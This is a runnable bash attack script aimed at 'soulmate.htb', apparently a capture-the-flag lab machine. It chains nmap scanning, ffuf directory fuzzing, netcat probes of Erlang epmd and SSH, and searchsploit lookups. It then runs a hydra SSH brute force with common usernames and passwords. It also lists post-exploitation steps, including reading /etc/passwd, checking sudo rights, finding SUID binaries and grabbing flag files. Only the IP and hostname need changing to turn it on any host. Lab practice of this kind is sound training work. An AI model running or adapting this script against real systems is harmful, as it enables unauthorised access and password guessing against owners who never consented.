#!/bin/bash
# SYSTEM 3: SOULMATE - COMPLETE RECONNAISSANCE & EXPLOITATION
# Update IP and hostname, then run

S3_IP="10.10.11.86"
S3_NAME="soulmate.htb"
OUTPUT_DIR="$HOME/Downloads/system3_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

cd "$OUTPUT_DIR"

echo "=========================================="
echo "SYSTEM 3: SOULMATE - COMPLETE TEST"
echo "=========================================="

# ============================================
# PHASE 1: RECONNAISSANCE
# ============================================
echo "[*] Phase 1: Reconnaissance"

# Connectivity
ping -c 4 $S3_IP > 01_ping.txt 2>&1

# Port scans
nmap -sC -sV -oN 02_initial_scan.txt $S3_IP
nmap -p- --min-rate 2000 -oN 03_full_scan.txt $S3_IP

# Web enumeration
curl -s -L http://$S3_NAME/ > 04_web_root.html 2>&1
curl -s http://$S3_NAME/robots.txt > 05_robots.txt 2>&1
curl -s http://$S3_NAME/sitemap.xml > 06_sitemap.xml 2>&1

# Directory enumeration
ffuf -u http://$S3_NAME/FUZZ -w ~/Downloads/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -t 50 -o 07_ffuf_common.json -s 2>/dev/null

# Try larger wordlist if available
if [ -f ~/Downloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt ]; then
    ffuf -u http://$S3_NAME/FUZZ -w ~/Downloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,204,301,302,307,401,403 -t 50 -o 08_ffuf_medium.json -s 2>/dev/null &
fi

# Erlang/epmd investigation
echo "names" | nc $S3_IP 4369 > 09_epmd_query.txt 2>&1
nc $S3_IP 4369 < /dev/null > 10_epmd_banner.txt 2>&1

# SSH banner
nc $S3_IP 22 < /dev/null > 11_ssh_banner.txt 2>&1

# ============================================
# PHASE 2: VULNERABILITY ANALYSIS
# ============================================
echo "[*] Phase 2: Vulnerability Analysis"

# Web vulnerability scan
nmap -p 80 --script vuln,http-enum -oN 12_web_vuln.txt $S3_IP

# Erlang/Phoenix exploits
searchsploit erlang > 13_erlang_exploits.txt 2>&1
searchsploit phoenix > 14_phoenix_exploits.txt 2>&1

# ============================================
# PHASE 3: EXPLOITATION ATTEMPTS
# ============================================
echo "[*] Phase 3: Exploitation"

# Try common web paths
for path in login register signup api admin dashboard; do
    curl -s http://$S3_NAME/$path > 15_web_${path}.html 2>&1
done

# SSH brute force
echo "admin
root
user
www-data
phoenix" > users_small.txt

echo "admin
password
123456
Password123
admin123" > pass_small.txt

hydra -L users_small.txt -P pass_small.txt ssh://$S3_IP -t 4 -o 16_ssh_brute.txt 2>&1

# ============================================
# PHASE 4: POST-EXPLOITATION (if access gained)
# ============================================
echo "[*] Phase 4: Post-Exploitation (run if access gained)"
echo "If you gain access, run these commands:"
echo "  - whoami"
echo "  - id"
echo "  - uname -a"
echo "  - cat /etc/passwd"
echo "  - sudo -l"
echo "  - find / -perm -4000 2>/dev/null"
echo "  - cat /root/root.txt 2>/dev/null"
echo "  - cat /home/*/user.txt 2>/dev/null"

echo ""
echo "=========================================="
echo "SYSTEM 3: SOULMATE - COMPLETE"
echo "=========================================="
echo "Results saved to: $OUTPUT_DIR"
ls -lh "$OUTPUT_DIR"

